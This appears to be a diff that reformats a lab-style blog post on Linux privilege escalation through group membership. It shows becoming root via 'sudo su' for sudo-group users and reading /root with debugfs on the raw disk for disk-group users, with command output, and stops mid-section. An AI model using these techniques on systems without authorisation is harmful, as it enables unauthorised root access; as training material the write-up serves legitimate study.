@@ -10,16 +10,12 @@ layout: post
 
 When a user is part of the `sudo` **group**, he can run any command as the `root` user.
 
-**Check Group**
-
 ```ruby
+# Check Group
 low@vulnyx:~$ id
 uid=1000(low) gid=1000(low) groups=1000(low),27(sudo)
-```
 
-**Abuse Group**
-
-```ruby
+# Abuse Group
 low@vulnyx:~$ sudo su
 root@vulnyx:~# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -29,27 +25,19 @@ uid=0(root) gid=0(root) groups=0(root)
 
 When a user is part of a `disk` **group**, he or she is granted direct access to the system **disks** and **partitions**.
 
-**Check Group**
-
 ```ruby
+# Check Group
 low@vulnyx:~$ id
 uid=1000(low) gid=1000(low) groups=1000(low),6(disk)
-```
 
-**Abuse Group**
-
-```ruby
+# Abuse Group
 low@vulnyx:~$ df -h
 Filesystem      Size  Used Avail Use% Mounted on
 udev            480M     0  480M   0% /dev
 tmpfs            99M  3.2M   96M   4% /run
 /dev/sda1        11G  2.2G  8.1G  21% /
 tmpfs           494M     0  494M   0% /dev/shm
-tmpfs           5.0M     0  5.0M   0% /run/lock
-tmpfs           494M     0  494M   0% /sys/fs/cgroup
-tmpfs            99M     0   99M   0% /run/user/1000
-```
-```ruby
+
 low@vulnyx:~$ /usr/sbin/debugfs /dev/sda1
 debugfs 1.44.5 (15-Dec-2018)
 debugfs:  ls /root
